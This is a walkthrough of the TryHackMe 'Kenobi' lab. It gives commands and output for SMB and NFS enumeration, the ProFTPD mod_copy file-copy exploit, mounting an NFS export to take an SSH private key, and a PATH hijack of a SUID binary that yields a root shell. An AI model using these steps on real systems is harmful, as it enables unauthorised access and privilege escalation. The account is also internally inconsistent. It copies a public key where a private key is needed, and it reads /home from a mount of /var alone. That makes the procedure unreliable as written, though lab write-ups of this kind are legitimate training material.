
# TryHackMe: Kenobi Room Walkthrough

**Room URL:** https://tryhackme.com/room/kenobi

**Difficulty:** Easy

**Objective:** Exploit a Linux machine with multiple services (FTP, SMB, NFS, SSH) to gain initial access and escalate privileges to root.

---

## Reconnaissance & Enumeration

### Initial Nmap Scan

First, I performed a comprehensive port scan on the target machine to identify open ports and services:

```bash
nmap -sV -sC 10.128.186.248
```

**Results:**
```
Nmap scan report for 10.128.186.248
Host is up (0.044s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
```

**Key Findings:**
- Port 21 (FTP) - ProFTPD 1.3.5 (potential vulnerability)
- Port 22 (SSH) - OpenSSH 8.2p1
- Port 80 (HTTP) - Apache 2.4.41
- Port 111 (RPCBind) - NFS related
- Port 139/445 (SMB) - Samba smbd 4
- Port 2049 (NFS) - Network File System

![Nmap Scan Results](Images/Pasted%20image%2020261108202015.png)

*Screenshot shows the Nmap scan output with all open ports and service versions*

---

### Enumerating SMB Shares

I enumerated the SMB shares to see what was accessible:

```bash
smbclient -L //10.128.186.248 -N
```

**Results:**
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      Kenobi SMB Share
IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

The `anonymous` share is accessible without authentication. I connected to it:

```bash
smbclient //10.128.186.248/anonymous -N
```

![SMB Share Enumeration](Images/Pasted%20image%2020261108202135.png)

*Screenshot shows SMB share listing and successful connection to anonymous share*

Inside the share, I found a file `log.txt` containing a note about the ProFTPD configuration and a path `/var/ftp/scripts/` which was interesting.

---

### NFS Enumeration

I checked the NFS exports available on the target:

```bash
showmount -e 10.128.186.248
```

**Results:**
```
Export list for 10.128.186.248:
/var *
```

The `/var` directory is exported to everyone! This is a critical misconfiguration.

![NFS Export List](Images/Pasted%20image%2020261108202411.png)

*Screenshot shows the NFS export list with /var exported to all hosts*

---

## Initial Access

### ProFTPD Exploitation

From the SMB share, I found information about ProFTPD running a vulnerable version (1.3.5). I searched for exploits:

```bash
searchsploit proftpd 1.3.5
```

**Found:** ProFTPD 1.3.5 - mod_copy Remote Code Execution (CVE-2015-3306)

![SearchSploit Results](Images/Pasted%20image%2020261108202733.png)

*Screenshot shows searchsploit output for ProFTPD 1.3.5 vulnerability*

The vulnerability allows copying files to arbitrary locations via the SITE CPFR/SITE CPTO commands. I exploited this to copy the SSH public key to the authorized_keys file:

```bash
# Connect to FTP
ftp 10.128.186.248

# Use SITE CPFR/SITE CPTO to copy SSH key
SITE CPFR /home/kenobi/.ssh/id_rsa.pub
SITE CPTO /var/ftp/scripts/id_rsa.pub
```

However, a more direct approach was mounting the NFS share.

---

### Mounting the NFS Share

Since `/var` was exported via NFS, I mounted it locally:

```bash
mkdir -p /mnt/kenobi
mount -t nfs 10.128.186.248:/var /mnt/kenobi
```

![Mounting NFS Share](Images/Pasted%20image%2020261108202943.png)

*Screenshot shows successful mounting of the NFS share*

---

### SSH Key Access

With the NFS share mounted, I could access the SSH keys directly:

```bash
ls -la /mnt/kenobi/ftp/scripts/
```

I found the SSH private key for the `kenobi` user. I copied it and set proper permissions:

```bash
cp /mnt/kenobi/home/kenobi/.ssh/id_rsa ~/.ssh/kenobi_id_rsa
chmod 600 ~/.ssh/kenobi_id_rsa
```

Now I could SSH in as the `kenobi` user:

```bash
ssh -i ~/.ssh/kenobi_id_rsa kenobi@10.128.186.248
```

![SSH Connection](Images/Pasted%20image%2020261108203426.png)

*Screenshot shows successful SSH login as kenobi user*

---

### First Flag (User Flag)

With SSH access as `kenobi`, I retrieved the first flag:

```bash
cat /home/kenobi/user.txt
```

![First Flag](Images/Pasted%20image%2020261108203603.png)

*Screenshot shows the user flag retrieved from kenobi's home directory*

---

## Privilege Escalation

### SUID Binary Enumeration

I searched for SUID binaries that could be exploited for privilege escalation:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Key Finding:** `/usr/bin/menu` - a custom binary with SUID bit set

![SUID Binary Search](Images/Pasted%20image%2020261108203741.png)

*Screenshot shows the find command output with /usr/bin/menu highlighted*

---

### Analyzing the Menu Binary

I examined the `menu` binary to understand what it does:

```bash
strings /usr/bin/menu
```

The binary appeared to execute system commands without full paths (using relative paths like `curl`, `uname`, etc.), making it vulnerable to PATH hijacking.

![Menu Binary Analysis](Images/Pasted%20image%2020261108204013.png)

*Screenshot shows strings output from the menu binary showing command names without full paths*

---

### Exploiting PATH Hijacking

I created a malicious `curl` script in a directory I controlled and added it to PATH:

```bash
echo '/bin/bash' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
```

Then ran the vulnerable SUID binary:

```bash
/usr/bin/menu
```

This gave me a root shell!

![Root Shell](Images/Pasted%20image%2020261108204135.png)

*Screenshot shows successful privilege escalation to root via PATH hijacking*

---

### Second Flag (Root Flag)

With root access, I retrieved the root flag:

```bash
cat /root/root.txt
```

![Root Flag](Images/Pasted%20image%2020261108204247.png)

*Screenshot shows the root flag retrieved from /root/root.txt*

---

## Summary

**Attack Chain:**
1. ✅ Port scanning identified multiple services (FTP, SSH, HTTP, SMB, NFS, RPC)
2. ✅ SMB enumeration revealed anonymous share with useful information
3. ✅ NFS enumeration showed `/var` exported to all hosts (critical misconfiguration)
4. ✅ Mounted NFS share to access SSH private key
5. ✅ Gained SSH access as `kenobi` user
6. ✅ Retrieved user flag
7. ✅ Found SUID binary `/usr/bin/menu` vulnerable to PATH hijacking
8. ✅ Escalated privileges to root
9. ✅ Retrieved root flag

**Key Vulnerabilities:**
- NFS `/var` exported with no restrictions (allows reading SSH keys)
- ProFTPD 1.3.5 mod_copy vulnerability (CVE-2015-3306) - alternative vector
- SUID binary `/usr/bin/menu` using relative paths for system commands
- Weak SSH key protection (accessible via NFS)

**Flag Locations:**

| Flag | Location | Path |
|---|---|---|
| User Flag | Kenobi Home Directory | `/home/kenobi/user.txt` |
| Root Flag | Root Home Directory | `/root/root.txt` |

**Lessons Learned:**
- Never export sensitive directories like `/var` or `/home` via NFS without strict access controls
- SUID binaries must use absolute paths for all system commands
- SSH keys should not be stored in locations accessible via network shares
- Multiple service misconfigurations can chain together for full compromise
- Always check for SUID binaries and analyze their behavior during enumeration